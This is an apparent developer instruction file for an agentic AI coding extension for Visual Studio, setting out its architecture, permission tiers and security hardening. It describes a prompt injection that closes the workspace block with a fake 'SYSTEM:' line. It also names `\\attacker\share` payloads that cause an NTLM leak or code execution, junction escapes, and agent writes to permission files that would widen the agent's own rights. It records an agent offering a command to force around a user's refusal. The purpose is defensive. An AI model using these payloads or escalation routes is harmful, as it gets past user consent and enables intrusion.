# Code Wicket

An agentic AI coding extension for **Visual Studio 2022 and 2026** with a **pluggable backend** (backends: **Kiro / AWS** and **Claude Code**, both over ACP). The **backend CLI owns the agent loop**, not Visual Studio; VS provides deep integration — IDE context injection, VS-native tools exposed to the agent (via MCP), and agent edits surfaced through VS diff/undo. Every backend sits behind one `IAgentProvider` abstraction.

## Where things are written down

**This file is loaded into every session; the area docs are not.** That is the whole basis for what is here and what is not. A rule earns a place in this file if you could hit it **cold** — before you had any reason to open the area doc — or if getting it wrong is a security or data-loss failure. Everything else lives in the doc for its area, in full, and the table below is how you get there.

### Recording what you learn

A rule you could hit **cold** goes in this file; the mechanism, the measurements and the rejected alternatives go in the area doc, in full. The maintainer's working notes — the backlog, the per-feature build logs, the account of how an investigation went — are kept outside this repository, and nothing published refers to them; volatile status goes there too, never into a doc. Six rules decide what a published sentence may say:

- **A measurement publishes; an incident does not.** *"Measured on VS 18.9.1"* and *"70% of edits report no line"* constrain what the reader does next. *"This shipped broken"*, *"that cost two rebuilds"*, *"found while re-running the security fixes in Visual Studio"* only describe our past. **Strike the sentence and ask what the reader lost** — a rule, or an anecdote. The mechanism is almost always already written underneath the story, and it defends the rule better because it can be checked.
- **Write the conclusion, not a pointer to it** (above). *"See the backlog"*, *"the measurements are in #73"* tells a reader something is written down where they cannot look.
- **Every identifier must resolve for a stranger.** Commit SHAs do not survive a history-free import, pull-request numbers were addresses used once, and a private security review's finding numbers name nothing outside it. `#NN` survives only because it is used as a *name* (above) — so a citation that carries CONTENT rather than a name has to be inlined.
- **No status word that ages**: *today*, *not yet built*, *not yet run in Visual Studio*, *still unconfirmed*. State the fact with the date it was measured, or say plainly that it was not verified.
- **"F5" is not a word for running Visual Studio.** It is re-bindable, so it names a keystroke and not a thing that happened. Where a statement is about what only a live Visual Studio instance can exercise, **say exactly that**; where it is about *when* something happens to the person debugging, say *"the next time they start debugging"*. Name the key only in an instruction addressed to the user, and then as the default — *"start debugging (F5 by default)"*. **The general form: a key is never the noun for an ACTION** — name the action and put the default key beside it, so *"VS's own C#-initiated F2"* becomes *"VS's own C#-initiated Rename (F2 by default)"*.
- **Nobody is a character.** Keep the symptom and the reasoning, drop who reported it and when they said it — and leave "the user" meaning the person using the extension.
- **A vendor's internals are a licence question, not only an accuracy one.** Record the behaviour observed on the wire or on disk, with the version it was seen on, rather than what was read out of their binary.

## Architecture / topology

- **Thin VSSDK shell (net472) ↔ out-of-process engine (net10.0)** over StreamJsonRpc. The shell owns the WPF tool window + the real `IIdeServices`; the engine owns `Core` + providers and drives the agent CLI. The provider's `IIdeServices` calls (edits/context/tools/permissions) marshal over IPC back into the VS process (an `IpcIdeServices` proxy in the engine). Mirrors ACP's agent↔client shape.
- **Target frameworks:** everything is **net10.0**; only the VS shell/IDE layer is **net472**. Shared libs multi-target `net472;net10.0`.
- **UI: native WPF (not WebView2).** A shared `CodeWicket.UI` library (controls + viewmodels bound to streamed `AgentEvent`s) is reused by the VS tool window and the standalone `CodeWicket.Desktop` host — best VS theming, no WebView2 runtime / JS↔C# bridge / npm, C# DTO sharing. WebView2 and Blazor were both considered and rejected. Rich rendering is Markdig (markdown) + ColorCode.Core (code), with the WPF rendering owned by us.
- **VSSDK, not `VisualStudio.Extensibility`, and the reason is `CodeWicket.Ide`.** The new model runs out-of-process, and almost the whole IDE layer is in-proc VS API surface it does not expose (`VisualStudioWorkspace`, AD7, `IErrorList`, `ITextEdit`, `DTE`, `SVsTerminalService`) — plus a tool window hosting our own WPF control, which its UI story does not allow. VSSDK extensions keep working in VS 2026, so migrating later stays open; **anything that would move `Ide` out of devenv closes that door rather than opening it.**
- **Permissions terminate in the shell process** (same process as the tool window), so the permission round-trip needs no extra IPC: `ShellRpcTarget.PermissionAsync → _ide.Permissions`, and the chain is `PolicyPermissionHandler → UiPermissionRouter → chat banner / msgbox fallback`. The agent stays blocked on its ACP `request_permission` while the user answers in the banner.

Rules that bind these, not obvious from the table:

- **`Providers.Acp` is config, not branching.** A new ACP agent = a new `AcpAgentConfig` in a thin per-agent project, or pure user config via `customAcpAgents` (built-ins win on id collision; bad entries warn + skip, never throw). `ProcessAcpConnection` kills the **whole process tree** (npm `.cmd` shims wrap node) and **drains the agent's stderr** into ours — that's where SDKs report MCP failures, and an undrained pipe can stall the child.
- **Kiro loads its own user-configured MCP servers through the active *agent config*, NOT our IDE-tool bridge** (injected separately via `SessionOptions.McpServers`), and **`cwd` *is* Kiro's workspace root** — it does no upward walk of its own.
- **`UI` has no `IsExternalInit` polyfill — don't add `record` types there**; use plain classes/delegates.
- **`Desktop` multi-targets so the self-check runs on `net472`, the slice devenv loads** (#106). Keep it TFM-neutral.
- **`Ide` does NOT ship Roslyn**: the reference is compile-only (`ExcludeAssets="runtime"`) and devenv provides the runtime assemblies. All VS APIs on the UI thread via `ThreadHelper.JoinableTaskFactory`.
- **The Console proofs are how backend behaviour gets *proven* rather than assumed**, and several rules in this file exist because a proof contradicted the design note. Three shapes worth knowing: a proof **need not need a live backend** (`clientfs-errors`); a proof **can ask what no offline test can reach** (`kiro-image`, where **the regression it guards is the silent one**); and a proof **may need a runtime the shipping code deliberately lacks** (`codefix-actions`, whose logic is **linked** — compiled, not copied).

## Key behaviours

**The rules you can hit cold, and the ones that are expensive to get wrong.** Two or three per area, not a summary of the area — each section's doc holds the rest, and you are expected to open it. A rule here that looks arbitrary is where that matters most.

### Edits and tool rows → [chat-ui.md](docs/engineering/chat-ui.md), [backend-behaviours.md](docs/engineering/backend-behaviours.md)

- **Both backends write files themselves** (Kiro's `write`, Claude's SDK `Write`), routing only *permission* through ACP; we mirror the `tool_call` diff read-only into `EditProposed` so diff/undo is uniform. Only Kiro **v3** takes the client-fs route.
- **Edits dedupe by `toolCallId|path`, so ONE canonical spelling per file is an invariant, not tidiness.** `Core.Ide.AgentPath` is the single canonicalizer. Relative paths root against the **agent's cwd**, never the solution root (#54), **refusing rather than guessing** when none is known.

### Sub-agents → [chat-ui.md](docs/engineering/chat-ui.md)

- **A sub-agent's calls nest under the row that launched it, and that row must not claim to be finished** (#125). **Parentage is a normalized field, not a backend shape** (`ParentToolCallId`), rides the **DTO**, and **an unresolvable parent is a top-level row, never a dropped one**.
- **A row draws at most `ChildCap` (5) children — the cap bounds DISPLAY, never DATA** — and keeps the **LAST** five, a blocked call being by definition the most recent.

### Mid-turn messages and steering → [chat-ui.md](docs/engineering/chat-ui.md)

- **Messages are HELD, not steered** (#70). **One modifier per rung of one ladder: Enter queues for the turn's END, Ctrl+Enter promotes to the next safe point, Ctrl+Shift+Enter cuts in now**; **queue is the default deliberately**. The rung comes from a pure function (`EnterGestures.For`), never from branching at the call site — inline, the top rung is unreachable and nothing fails.
- **A delivery carries a `<mid-turn-message>` block the user did not write, bounded by one rule: it may only restate what their gesture already said.** Anything else is ventriloquism. **On the wire only**, or a resume replays ours as theirs.
- **A steer landing on an MCP call destroys it unrecoverably, and `build_solution`/`run_tests` are ours.** The killed call is **ORPHANED, not cancelled**. **Parity is supplied by the HOST**, sweeping still-`Running` rows to interrupted client-side. **Steering is a MECHANISM, not a capability — measured**, so **the two backends must not behave differently from the user's seat**: same release points everywhere, delivery chosen from the handshake and never from a provider name.

### Handed-over context: images and the prompt blocks → [chat-ui.md](docs/engineering/chat-ui.md)

- **Never `Clipboard.GetImage()`** (via `CF_DIB`, drops alpha). **Written at SEND, not at paste; the transcript stores a PATH, never bytes.** **No age rule — size is the only thing that reclaims**; an attachment is conversation content, not scratch. **Files are deliberately NOT attachable** — the agent reads those itself and gets the *current* bytes (#95); a pasted snip is the exception because it has no path to reference.
- **Wire order is `<conversation-summary>` → `<debug-state>` → `<mid-turn-message>` → the text**, from ONE `ComposeOutgoing`. **Both captures are FENCED per send, like the workspace block** (pre-release security review, September 2026): the pane and the locals are text the host quotes, and a close tag inside either stood at host level. **`HostPromptBlocks.DebugState` is deliberately NOT in `All`** — that list is `Strip`'s removal set — which is why `SplitLeading` exists.

### The debugger → [ide-services.md](docs/engineering/ide-services.md)

- **Its EXISTENCE is ambient; everything else is pulled** (#73). `<workspace-context>` carries one line while a session is live — that is what the agent cannot get by asking. Frames, locals and values stay OUT.
- **The guard is a TOOL NAME** (rung 3): `read_expression` is `ReadOnly`, `execute_expression` is `Command`. **Two names, not one tool with an `allowSideEffects` argument** — a permission request arrives BEFORE the frame carrying its arguments, so an argument-shaped guard prompts on every guarded read. **A facility whose SAFETY DIRECTION depends on the backend is the thing not to build.**

### The IDE-tool MCP bridge → [backend-behaviours.md](docs/engineering/backend-behaviours.md)

- **`McpToolServer` params must be BOTH accepted and optional** — Kiro sends `tools/list` with params, Claude with none; either mismatch silently registers zero tools.
- **A tool description past 2KB is cut SILENTLY on Claude** (Claude Code 2.1.84), and the cut text reads fine in every review — `get_diagnostics` lost its counts-differ steering that way. Descriptors live in `Core.Ide.IdeToolDescriptors` so a test can hold each to 2,048 bytes and its first sentence, the `<ide-tools>` summary, to 200 chars. **A cap is named by the field that reports it, never a copied number.**

### The agent's workspace root → [backend-behaviours.md](docs/engineering/backend-behaviours.md)

- **Always pass a cwd, and an ABSOLUTE one** — null is workspace-*discovery* semantics, walking every bucket on the machine. **`FakeSession` deliberately cannot answer warm**, or every CLI-pickup check moves onto the warm path silently.
- **Agent working directory ≠ solution root** (#54). **The guardrails are the whole safety story**: `~/.kiro` exists on every Kiro install, so an unbounded walk makes the profile folder the agent's workspace. Which backends widen is **data**, not a branch. **Widening is never silent.**
- **A repository may DESCRIBE itself and may never EMPOWER itself** (#59). **The schema is an allowlist BY CONSTRUCTION** — `ProjectSettingsReader` asks for each honoured key by name and never deserializes into a type. **`RefusedKeys` is REPORTING, not defence.** **Malformed JSON applies NOTHING.** **An unknown key is log-only** — a repo shared across two extension versions must not warn everyone on the older one every session. **Relative only**: an absolute value is *refused*.

### What the backends report → [backend-behaviours.md](docs/engineering/backend-behaviours.md)

- **A backend failure carries the backend's own account of itself** (#82) — `Details` was crossing the wire and being **dropped one step short of the screen**. **Plain text, not markdown** (stderr and stack traces must survive verbatim), selectable, to be pasted into a bug report.
- **`run_command` is default ON, and the registration was never what bounded it**: it carries the top `Command` tier, so every mode below AcceptAll prompts. What "off" buys is *never advertising it*. **The flip does NOT reach existing installs, deliberately.**

### Permissions, and what we can honestly claim → [permissions.md](docs/engineering/permissions.md)

- **An inline image's "local" is a CONTAINMENT, not a scheme** (pre-release security review, September 2026). A UNC path is rooted, so a scheme guard opens `\\attacker\share\x.png` on the dispatcher with no click — an NTLM handshake and an SMB timeout on the UI thread. A file source renders only where `WorkspacePath.IsUnderRoot` puts it inside the renderer's link-context root; no root, no file. **The decode stays synchronous, deliberately.** **The containment resolves LINKS below the root, refusing rather than following**: a junction passes the spelling test and `Exists` follows it to the host, so `Core.Ide.ReparsePoints` reads the reparse TAG by an API that opens nothing. **And the budget is on DECODED pixels, read from the header**: a sub-megabyte PNG decodes to gigabytes, so `ImageDecodeBudget` refuses before a pixel exists.
- **Permission precedence: deny tier → caution tier (`AlwaysPromptCommands`, overriding both allow-list and mode) → allow tier → mode → prompt.** Modes are a cumulative ladder over a resolved tier (Read < Edit < Command); our MCP tools resolve by *name*, everything else by `kind`, **anything unrecognised landing top-tier**.
- **We own every "always" client-side** — auto and remembered approvals answer `allow_once` — **but only over the requests that ARRIVE, and what we can honestly claim comes in THREE TIERS** (#269, proven live on both backends 2026-09-11): what runs THROUGH us we could enforce and do not; what the agent ASKS about gets our policy as a second gate; what the agent does WITHOUT asking is invisible. **The failure mode is an ABSENCE, and an absence looks like a quiet session.**
- **The backend's mode is a function of OUR picker, never of a file the agent can write**: `AcpAgentConfig.BackendModes` maps the picker onto the agent's own modes as per-agent DATA — ACP standardises what a mode looks like, not what it means — asserted after EVERY open, and it **fails OPEN and says so**. **Claude has the lever and Kiro v2 has none**; the Console `backend-gate` proof is how either claim is re-checked.
- **One glob grammar, `Core.PermissionGlob`, with `[*]`/`[?]` as the literal characters.** Allow globs are **anchored**; the caution list is deliberately unanchored substring. The banner seeds the "always" pattern ESCAPED, because the agent writes the command and so wrote the rule's shape. **A wildcard rule never covers a line containing a shell operator — a REFUSAL on the union set (`Core.ShellOperators`, code not config, deliberately broad), never a chain detector**: which shell runs the line is not ours to know, so the only honest claim is the character test, and it errs towards the ORDINARY banner with a note naming the rule withheld. Exact rules are exempt; the mode still decides after it.
- **An MCP tool call is not a shell command, whatever its title says** (#129). **The durable home is `AllowedTools`: one rule shape, `server/tool`, and the server in it IS the collision guard.** **Normalization is idempotent** — the list is re-normalized on every load, so a rule that could not survive its own output shape would be forgotten one restart after it was made. **A foreign rule matches by CONSTRUCTION, never by parsing the incoming name.** **And it is not a FILE either: an MCP call takes no path subject** — a path rule auto-approves it, offers a path glob instead of the tool rule, and hides the arguments from the approval.
- **A SHELL COMMAND HAS NO TRUSTED NAME.** Kiro titles a shell run `Running: <what the model chose>`, so a command can spell itself as one of our tools and take its ReadOnly tier. **The guard is a fact the title cannot forge** — an execute kind or a real `rawInput`/cached command (`TrustedToolName`) — and where it is absent, which is every real MCP call on both backends, nothing changes.
- **A write into the extension's OWN state is never auto-approved, and the rule is code, not config.** Under AcceptEdits an edit to `config.json` was approved with no banner, and that file is re-read into the live policy on the next settings save and names what the next engine launch spawns. `Core.ProtectedPaths` sits on the caution tier AHEAD of every allow rule and remembered glob — an `AlwaysPromptCommands` entry would have done it, and is in the file the first write replaces. **Writes only on the path route**; the agent's own workspaces are exempt by NAME, or the rule fires on every edit with no solution open. **A command line gets a spelling test on ONE spelling, and it is a tripwire, not a guard on the file.** **The banner and the row say WHY.**
- **A write to a file that sets what the agent may do WITHOUT asking is the same rule one step earlier** (#269 follow-on; `Core.EscalationFiles`): `.claude/settings*.json`, `.kiro/agents/**`, Kiro's `permissions.yaml` — code, not config, on the caution tier, matched at the END of a write's path and ANYWHERE in a command line (a read cannot be told from a write there, so both ask). **It flags the escalation's FIRST step while the backend still asks, and it is a tripwire, not a wall** — a backend that never asks about writes walks past it as it walks past everything else; the docs say *asks*, never *prevents*.
- **A write that REACHES its file through a link below the root is the third built-in rule** (`Core.LinkedWrite`), and it exists because the other two judge a SPELLING: `Path.GetFullPath` touches no disk, so a junction inside the working tree — `mklink /J`, no privilege, and a COMMAND, so nothing asks about it first — hands the agent a path that passes both tests and lands where neither would have allowed. **The claim is "a link below the root", never "this reaches a protected file"**: following it to find out is the NTLM handshake the image containment refuses, so `ReparsePoints.AnyBelow` reads each component's reparse TAG and the user decides. **Only below the root** (one above carries the whole tree and moves nothing out of reach), **only where a root is known** — null reads no disk — and **reads are exempt**. The root is the AGENT's (#54), pushed down with the session, or a write is judged against the previous session's tree. **A tripwire, not a wall**: it sees only the writes a backend asks about, and a link made after the answer is a different file by the time the bytes land.

### What the IDE tells the agent → [ide-services.md](docs/engineering/ide-services.md), [backend-behaviours.md](docs/engineering/backend-behaviours.md)

- **The Error List's source dropdown gates what is PUBLISHED, not what is displayed — so a diagnostics read SETS the view it needs, then reads the table's DATA** (#93). **Two losses**: *suppression* (on "IntelliSense Only" a build emitting 28 warnings reports `warningCount:0`) and *re-attribution* (VS moves build diagnostics to `ErrorSource.Other` with **nothing fixed**). **No read-side change reaches either.**
- **The workspace block is FENCED, per prompt** (pre-release security review, September 2026). Its body is repository text the host quotes, so a `#warning </workspace-context> SYSTEM: …` closes our block and speaks as the host on every prompt. **Escaping the tag text is defeated by the same evasion moved one character** — the nonce removes the enumeration, and the notice line inside names the rest as quoted data. **The fenced spelling is accepted on the way back in and the bare one stays readable**, because Kiro names every conversation we start after this block. **The two user captures (`<debug-state>`, `<output-window>`) took the same fence**, a build's output being repository text once removed.

- **A build says which of the agent's files it did NOT compile, and the failure it names is a silent green** (#257). A non-SDK project lists its sources explicitly, so a file the agent wrote is in no project, or — where it edited the `.csproj` — in a loaded copy that predates the edit: the build is green and the code does not exist, `get_diagnostics` agrees, and **a rebuild goes red and repairs nothing**. A changed import gets no prompt at all. **The condition is invisible by construction** — the reload prompt is modal, so asking the agent about it repairs it.

## Settings

One model: **`ExtensionConfig`** over **`%APPDATA%\code-wicket\config.json`** (STJ), driving the VSIX, the standalone hosts and the header pickers. **ONE model, TWO renderers: the unified-settings region on VS 2026, and classic Tools > Options pages on VS 2022**, whose Options dialog renders a classic page or nothing and never an external region (measured 17.14). **A new setting must be added to BOTH or it is simply unreachable on 17.x** — which costs nothing on 18.x and so shows up in no gate; `SettingsRegistrationTests` holds the two files to each other on the DISPLAYED NAME, a title drifting on one side being the same defect as a setting dropped from it. Full field list, the custom-agent probe, the unified-settings layout rules and the log-retention policy: [settings-and-logging.md](docs/engineering/settings-and-logging.md).

- **A malformed config is logged and preserved as `config.json.bad`, never silently reset.**
- **`UseStubIde` is config-only, deliberately NOT in Unified Settings** — developer plumbing that only makes a normal install behave oddly. Hand-editing config.json is the escape hatch. **The engine executable override is `CWKT_ENGINE_EXE` and no longer a config field** (pre-release security review, September 2026): config.json is agent-writable under AcceptEdits, and a path in it was code execution on the next window open.
- **A rename must stop at the title — the leaf is the config binding.** Carrying one into the leaf silently orphans the setting on every machine that had already set it. **`CacheTag` is stamped by the build from a hash of `registration.json` — never hand-write it.** Leaf names are a cross-region invariant: the provider matches on the last dotted segment, so two regions sharing a leaf silently read and write the same field.

### Logging and startup

- **`DiagnosticLog.AppendLine` stamps every line it writes.** The format belongs to the type that already owns the lock, the roll and the retention; left to callers it drifted into three formats while the highest-volume writer of all carried no time at all. **Stamped inside the write lock**, or two concurrent writers land in the opposite order to their stamps. It is **write time at the sink**. The byte tees are untouched — injecting text into a raw protocol stream corrupts it.
- **Log retention is ONE policy, owned by `Core.DiagnosticLog`**: roll aside at start, roll again past 5 MB, sweep by age (7 days) and total budget (50 MB). Age and size are the only things that delete a log — deliberately no cap on generation count. **A tee's owner MUST dispose it at teardown**, or the next run's roll silently fails and two runs braid into one file.
- **Bulk file enumeration or deletion NEVER runs on the UI thread** — a rule, not a measurement result: AV/EDR hooks, folder redirection onto a share and VDI all put the ceiling out of our hands. It binds every caller. **A sweep may only be pointed at a directory we exclusively own** (`RetentionSweep`'s second caller is the diff scratch dir, #88; `DiffScratchRoot()` returns null rather than inheriting a `%TEMP%` fallback).

## Conventions

Two kinds of rule live here. **Required** — breaking it breaks the build, the package or the product. **House style** — the discipline this codebase is maintained with; a contributor is asked to follow it, but it is a choice, not a property of the code. Marked where it isn't obvious.

- **Build with `dotnet build CodeWicket.slnx`** (green incl. the VSIX). Target 0 warn / 0 err.
- **Offline verification before running in Visual Studio** *(house style — and the reason much of this file exists)*: `dotnet test`, Desktop `--smoke` on **both** TFMs and the relevant `--screenshot*` modes, all through **`scripts/run-gates.ps1`** (build once, then fan out: 35 s wall against 97 s serially), plus any relevant Console proof, run by hand. The rules below were each earned by a *harness* defect rather than a product one:
  - **The exit code is not the result.** Every `--screenshot*` mode and `--perf` catch their own exceptions and still exit 0, so **the artifact is the result** — and it must be *fresh*. `run-gates.ps1` **requires pwsh**: under 5.1 `Start-Process -PassThru` yields an empty `ExitCode` and **every gate reports `FAIL ()` over its own PASS**.
  - **The automated runs MUST NOT touch the user's real config** — `ExtensionConfig.RedirectTo` first thing in `OnStartup`. *Interactive* runs deliberately keep sharing the real file, that parity being the point of the host. Isolation is **one lever**, `CWKT_SCRATCH_DIR`. **When shared state resets inexplicably, check what the harness writes before theorising about the product.**
  - **On a focus failure read the `foreground=` stamp first**: `elsewhere` means the machine was in use and the result says nothing. Failures are **appended** to `smoke-failures.log` — re-running to see whether a failure was intermittent is what destroys the evidence for it.
  - **A `--smoke` phase must leave the transcript as it found it, and REMOVING what it added is not enough** — virtualisation churn outlives the removal, so a disruptive phase runs **LAST**.
  - **A check that cannot separate a fix from its fallback pins neither.**
  - **`--perf` is a measurement, not a gate** — and **a timeout is not a measurement**. Never rebuild while a sweep is in flight.
  - **Verify every new check is load-bearing by injecting the bug it guards** *(house style)*, through **`scripts/prove-check.ps1`** — never `git checkout -- <file>`, which takes every uncommitted change in the file with it. It hashes its targets so an injection that doesn't land is a hard error, **inverts the result** (green over an injected bug is `PINS NOTHING`), and has a third verdict, `INCONCLUSIVE`. **THE COUNT AND THE IDENTITY TOGETHER ARE WHAT MAKE A VERDICT REAL** — either alone is satisfiable by accident.
  - **A solo run and the gate matrix are different instruments, and `PINS NOTHING` is a verdict on the check AND ITS VERIFIER** (#218). A race is only visible on a contended machine, so a `run-smoke.ps1` verify reported the same numbers over broken and fixed code — **two runs agreeing is not evidence when neither was contended**. Where the subject is a race or a layout pass, the verifier is **`run-gates.ps1`**, and the check says so in its own doc.
  → [verification.md](docs/engineering/verification.md)
- **A tool result fails when the caller would be MISLED, not when the outcome is unwelcome.** It *couldn't run* → error. It ran and produced a *legitimate negative* (build failed, tests failed, no matches, exit 1) → **success, because the negative IS the answer**; failing it teaches the agent to read "the build has errors" as "the build tool is broken". It was asked to *change* something and nothing changed → error. **Queries report, mutations must confirm.** `IsError` is the only field an agent reliably reads, so the prose summary must agree with it. Where a query genuinely cannot distinguish "none" from "couldn't look", **say so in the payload rather than failing**.
- **And where it CAN distinguish them, one `catch` over the walk collapses them again** (#272). `Core.Ide.DebugPaneRead` is **FOUR** answers, not two: no Output window and no Debug pane both SUCCEED and both **name the instance they read**, while a search that did not finish and a pane found-but-unreadable both fail and **say in as many words that they are not an empty pane**. **An absence inferred from a throw KEEPS the throw.** **The per-pane guard**: one stranger's `Guid` getter throwing ends the search, so finding a readable pane turns on which extensions are installed — and on the shared Build-pane read that loss is SILENT.
- **A result's counts must RECONCILE, and the runner's own header is not the record** (#259). The VSTest TRX logger writes `notExecuted="0"` beside results it has just recorded as `NotExecuted` — every classic adapter, measured — so a run reading the header alone drops ignored/inconclusive tests into no bucket, and **a suite containing them looks exactly like a clean one**. `Core.Ide.TrxSummary` takes skipped as the LARGER of header and results, **NAMES them** with the runner's recorded reason, and **lists every project's TRX**. **A test's `name` is what the RUNNER wrote and is not a name**, so `className` and `project` ride beside it, **never joined into one**.
- **An agent-supplied value is ONE argument, never a piece of command line** (pre-release security review, September 2026). `run_tests`' raw `filter` was appended to the command verbatim, so `--test-adapter-path \\attacker\share` was code execution through a ReadOnly tool. The option is ours per dialect, every value goes through `Core.Ide.CommandLineArgument.Quote` (proven against the real `CommandLineToArgvW`), and **a value that IS an option is refused, not stripped**. **A backslash not before a quote passes through** — a blanket ban breaks VSTest's own `\(` escapes. **And a value is safe only as far as the LAST parser that reads it**: `dotnet test` maps `--filter` onto an MSBuild PROPERTY, so a quote in the value sets one silently — and is refused, which neither dialect's grammar needs.
- **`fs/read_text_file` of a missing file THROWS — it must never return `""`.** The damaging shape isn't the obvious one: a path that resolves slightly wrong reads as empty, so the agent concludes the file is blank, writes a complete "fixed" version to that wrong path (a write CREATES, so it succeeds) and reports the edit done while the real file is untouched. A **range past the end of a file that exists stays empty**: found, nothing there. The range is `Core.Ide.TextRange`, shared — **which host an agent is talking to must never change what a read means**.
- **A VS write route must CONFIRM, because the editor refuses without throwing.** `ITextEdit.Apply()` returns the *unchanged* snapshot when the change is cancelled, which is what the read-only / checkout prompt does when dismissed. Check the text landed **against the handle you already hold, never by re-reading the file** — the disk copy is legitimately stale here. **Three outcomes, not two**: `Unavailable` = try the next route, `Refused` = the editor said no, and **routing around a refusal is the thing that must not happen**.
- **A HEDGED reason is worse than no reason, because the reader replaces it — measured on the wire.** A refusal saying the edit "usually means the file is read-only or needs checking out" reached the agent intact, which then told the user it was *"likely because the file is open in the editor"* and offered a shell command to force it — a cause we never suggested, and a workaround that would carry out the change the user had just refused. **Given a sentence that declines to commit, a model supplies its own and states it more confidently.** So `Core.Ide.FileWriteRefusal` says what was CHECKED, names no cause where that does not hold, says the file is **unchanged**, and **closes the workaround explicitly**. Pure and in Core because the wording IS the behaviour, and its tests assert wording for the same reason.
- **An OPTIONAL enrichment may never fail the operation it decorates** (#189). **The asymmetry is the tell**: the *display* callers catch and degrade, and it is the *agent-facing* ones that are written without a catch. The disk fallback is **logged**, being the one case where our answer is knowingly not the best available.
- **Parse agent message content in the ACP layer, not the UI.** Anything reading a **backend-specific shape** or producing a **semantic artifact** belongs in `AcpMapper`, on typed fields, unit-testable without WPF. **The corollary: a DISPLAY cap may never cut something that is DATA** (#83) — `Clamp` cutting our own `run_tests` payload mid-string raises an exception blaming a "transport cap" that does not exist. The exemption is **bounded**, lives in the mapper, and its marker is **one literal in `Core.Ide.StructuredToolResult`**. **A failure hidden behind working mitigations stays invisible.**
- Version-specific measurements were taken on **VS 2026 Professional 18.9.1**. **VS 2022 Professional 17.14 is the second measurement environment** (2026-09-16): the engine, `CodeWicket.Ide` in devenv, the MCP tool bridge and the client-fs edit route were all exercised there. **Both are supported, and where they differ the difference is stated.**

## Gotchas

The ones that bite during ordinary work. Most carry their diagnosis in [gotchas.md](docs/engineering/gotchas.md).

- **Never use temp for anything agent-facing** — no process launched with a temp cwd, no agent-content files written to temp: corporate EDR can flag temp activity as suspicious. Use stable per-user dirs under `%LOCALAPPDATA%\code-wicket\`. Temp remains fine for dev-only artifacts.
- **A StreamJsonRpc response can overtake the notifications that preceded it** (#33) — hence `Core.OrderedDispatchSynchronizationContext` plus a drain barrier before the response is acted on, **on BOTH hops**: the engine ↔ agent hop drains before a turn writes its completion, and the shell ↔ engine hop (#277) drains inside `EngineClient` before ANY response is handed on — every call, not only the prompt, because otherwise "does anything act on this response as if the frames before it had landed?" is a per-call-site question with a silent wrong answer. **The barrier orders the RAISE, not the APPLY**: on the host both the apply and the response's continuation are dispatcher hops, and priority decides which runs first — so the view-model queues live events and applies the queue INLINE before acting on a response. **The pump runs one handler at a time, so the shell's request handlers leave it at once** (`ShellRpcTarget.OffPump`). Any future "the agent sent it but we never showed it" report starts here.
- **An inbound handler bound to a TYPED params record silently loses large frames** (the NUL-padded-span gotcha): STJ deserializes from a rented buffer larger than the message and reads on into the padding. Ask for a raw `JsonElement` instead. **On a notification there is no error anywhere** — the frame simply never reaches the handler — so every symptom is an absence, and **a frame in acp.log is NOT evidence the handler ran**.
- **A NUL byte anywhere in a source file makes git treat it as binary** — no line diff, and invisible to `git grep`. One file kept a pre-rename namespace through an entire sweep because of it. Write separators as escapes, never as raw control bytes; `grep -a` answers the question `git grep -I` silently declines to.
- **In-proc assembly binding (net472) — the identity-split gotcha.** Which copy of an assembly our in-proc code binds to is decided by that VS build's own `devenv.exe.config` redirects, not by what we bundle, so one graph can hold two copies of a type that don't unify. **Policy: the net472 slice pins StreamJsonRpc to the `Microsoft.VisualStudio.SDK` baseline.** The invariant is not "one copy in the process" — it is that **any assembly whose Memory/Pipelines/StreamJsonRpc-typed objects cross into VS-shipped assemblies must compile against baseline versions**.
- **The same file decides which WPF we render on**: VS 2026 redirects every WPF assembly to 10.0.0.0 with a `codeBase` into `AppLocalWPF\`, so despite `devenv.exe` being net472 our VSIX draws on the **modern dotnet/wpf stack, NOT .NET Framework's 4.0.0.0 WPF** (measured 18.9.1). An upstream WPF fix can therefore reach the VSIX via a VS update. **On 17.x there is no such redirect and we render against 4.0.0.0 WPF**, so the two hosts draw the same XAML on different stacks — measured working on 17.14 (2026-09-16), the markdown/emoji island included, which is the part most likely to differ.
- **An UNSIGNED bundled assembly is a process-wide name another extension can CAPTURE via pkgdef** (#103). Another extension registering a `codeBase` for the simple name **`Markdig`** routes **every** request for that name, from any extension, to that one file with **no fallback**. **Four corollaries, each the opposite of the intuitive reading**: not a load-order race and not "one copy per AppDomain"; triggered by **install, not use**, so the other extension need never load; **not symmetric, and the captor is unharmed**; and **version-matching would work but is the wrong fix**. **Fix, in preference order: a strong-named package first** (`Markdig` → `Markdig.Signed`). An ILRepack merge is **refused** — its package ships a destructive default target. The standing guard is a **package-level release gate**: fail on any unsigned third-party DLL outside an allowlist, and positively assert the signed one is present. **`Emoji.Wpf`, `Typography.*` and `Stfu` can take NEITHER treatment**, which makes `MarkdownRenderFirewall` their only protection, permanently.
- **Fresh-machine "Starting Code Wicket…" hang = a missing net472 dependency in the .vsix.** VSSDK packaging excludes everything resolving through the SDK metapackage as "provided by VS"; `IncludeShellDependenciesInVsix` force-adds them. A development box masks it, because the extension is deployed there rather than installed. **Verify after any packaging change: unzip the .vsix and diff its root DLLs against `bin\Debug\net472\*.dll` — the difference must be empty.**
- **The experimental instance has its OWN extension set, so cross-extension conflicts are INVISIBLE to every run made there** — that is why #103 shipped, and it is a harness blind spot, not a review miss. **To test for pkgdef name capture, install into that hive an extension that registers a `codeBase` for a simple name we also ship**, which turns the repro into a standing regression test. Two instruments fail as a believable absence while devenv runs: `privateregistry.bin` is a loaded hive, and **`Process.Modules` is blind to extension managed assemblies**. **Make any instrument prove it can see a known-present thing before trusting what it does not find.**
- **In the experimental instance:** a stale bundled engine desyncs the shell↔engine pipe (`":' is an invalid start"`) — rebuild + reset the hive. New Unified Settings properties are picked up by the build-stamped `CacheTag` alone; `/updateConfiguration` is the fallback, not a routine step.
- **`launchSettings.json` env vars NEVER reach the experimental devenv** (the debug launch runs through the VSSDK debug target). Configure runtime behaviour via `config.json`, not launch env.
- **VSIX build (SDK-style, VS 2026/18.x):** set `VSSDKBuildToolsAutoSetup=true`; build with `dotnet build` or the IDE, never standalone net472 `MSBuild.exe`; gate `DeployExtension` to inside-VS; cross-TFM `ProjectReference` needs `ReferenceOutputAssembly=false` + `SkipGetTargetFrameworkProperties=true`. **Parent a `<Button>` directly into a standard shell group — a custom `<Group>` nested under another group makes VS silently drop the command.** Pinned to `Microsoft.VSSDK.BuildTools` 18.5.40034; do not bump.
- **WPF `Run.Text` binds two-way by default** — bind read-only VM props as `Mode=OneWay` or it throws at render.
- **Building only the UI project leaves a stale `CodeWicket.UI.dll` in the host bin** — rebuild the host to pick up UI XAML changes.
